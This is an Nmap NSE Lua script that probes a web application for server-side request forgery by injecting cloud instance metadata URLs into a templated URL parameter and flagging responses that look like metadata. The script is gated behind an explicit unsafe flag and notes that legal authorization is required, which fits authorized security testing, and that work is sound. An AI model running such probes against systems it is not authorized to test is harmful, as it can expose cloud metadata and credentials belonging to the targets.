local http = require "http"
local http_offsec = require "http_offsec"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local url = require "url"

description = [[
Probes application endpoints that embed a URL parameter (template with literal
CANARY) using cloud instance metadata URLs.

Requires http-cloud-metadata-reach.unsafe=1 (and legal authorization).

Example: --script-args 'http-cloud-metadata-reach.template=/api/proxy?target=CANARY,http-cloud-metadata-reach.unsafe=1'

Intrusive: may cause the application to reach metadata IPs.
]]

author = "nmap-ppro"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive"}

portrule = shortport.http

action = function(host, port)
  local gate = http_offsec.intrusive_gate(SCRIPT_NAME)
  if gate then
    return stdnse.format_output(false, gate)
  end

  local template = stdnse.get_script_args(SCRIPT_NAME .. ".template")
  if not template or not string.find(template, "CANARY", 1, true) then
    return stdnse.format_output(
      false,
      "Set http-cloud-metadata-reach.template=/path?param=CANARY"
    )
  end

  local terr = http_offsec.assert_safe_http_request_path(template)
  if terr then
    return stdnse.format_output(false, terr)
  end

  local TARGETS = http_offsec.cloud_metadata_targets()
  local lines = {}
  for _, t in ipairs(TARGETS) do
    local path = http_offsec.substitute_canary(template, url.escape(t.u))
    local perr = http_offsec.assert_safe_http_request_path(path)
    if perr then
      return stdnse.format_output(false, perr)
    end
    local resp = http.get(host, port, path)
    local st = resp and resp.status and tostring(resp.status) or "?"
    local blen = (resp and resp.body and #resp.body) or 0
    local hint = ""
    if resp and resp.body then
      local b = string.lower(resp.body)
      if string.find(b, "ami-", 1, true) or string.find(b, "instanceid", 1, true) then
        hint = " (body hints at cloud metadata JSON/text)"
      end
    end
    lines[#lines + 1] = ("%s: status=%s len=%d%s"):format(t.name, st, blen, hint)
  end
  lines[#lines + 1] = "Differential responses may indicate SSRF; verify legally and out-of-band."
  return stdnse.format_output(true, lines)
end
